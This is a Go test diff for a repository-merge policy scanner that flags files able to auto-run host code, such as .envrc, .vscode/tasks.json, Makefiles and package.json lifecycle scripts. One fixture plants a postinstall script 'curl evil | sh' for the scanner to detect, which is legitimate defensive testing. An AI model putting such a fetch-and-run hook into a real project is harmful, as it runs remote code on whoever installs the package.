@@ -5,6 +5,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"slices"
+	"strings"
 	"testing"
 
 	"github.com/AndrewDryga/coop/internal/config"
@@ -379,4 +380,75 @@ func TestHostGitHardeningOnPoisonedParent(t *testing.T) {
 			t.Fatal("positive control failed: raw git diff did not run the planted diff.external")
 		}
 	})
+}
+
+func TestInteractionRiskPath(t *testing.T) {
+	cases := []struct {
+		status, path string
+		flagged      bool
+	}{
+		{"A", ".envrc", true},
+		{"M", ".envrc", true}, // a modified .envrc is a vector too
+		{"A", "sub/.envrc", true},
+		{"A", ".vscode/tasks.json", true},
+		{"M", "x/.vscode/tasks.json", true},
+		{"A", "Makefile", true},
+		{"M", "Makefile", false}, // a modified Makefile is too common to flag
+		{"A", "GNUmakefile", true},
+		{"A", "src/main.go", false},
+		{"A", "tasks.json", false}, // only flagged under .vscode/
+		{"D", ".envrc", true},      // status[0]=='D' is filtered by the caller, not here
+	}
+	for _, c := range cases {
+		if got := interactionRiskPath(c.status, c.path) != ""; got != c.flagged {
+			t.Errorf("interactionRiskPath(%q, %q) flagged=%v, want %v", c.status, c.path, got, c.flagged)
+		}
+	}
+}
+
+// policyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
+// scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
+// are advisory). Build the change as a branch so policyScan's `HEAD...ref` diff is exercised.
+func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not available")
+	}
+	repo := initRepo(t)
+	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test"}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	git(t, repo, "add", "-A")
+	git(t, repo, "commit", "-qm", "base package.json")
+
+	// A branch that introduces an .envrc and adds a postinstall script.
+	git(t, repo, "checkout", "-q", "-b", "evil")
+	if err := os.WriteFile(filepath.Join(repo, ".envrc"), []byte("export X=1\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test","postinstall":"curl evil | sh"}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	git(t, repo, "add", "-A")
+	git(t, repo, "commit", "-qm", "evil")
+	git(t, repo, "checkout", "-q", "main")
+
+	w := strings.Join(policyScan(repo, "evil"), "\n")
+	if !strings.Contains(w, ".envrc") {
+		t.Errorf("policyScan did not flag .envrc:\n%s", w)
+	}
+	if !strings.Contains(w, "postinstall") {
+		t.Errorf("policyScan did not flag the added postinstall script:\n%s", w)
+	}
+
+	// A branch that edits package.json benignly (version bump, no new lifecycle script) is not flagged.
+	git(t, repo, "checkout", "-q", "-b", "benign", "main")
+	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","version":"2","scripts":{"test":"go test"}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	git(t, repo, "add", "-A")
+	git(t, repo, "commit", "-qm", "bump")
+	git(t, repo, "checkout", "-q", "main")
+	if w := strings.Join(policyScan(repo, "benign"), "\n"); strings.Contains(w, "package.json adds") {
+		t.Errorf("a benign package.json edit was wrongly flagged:\n%s", w)
+	}
 }
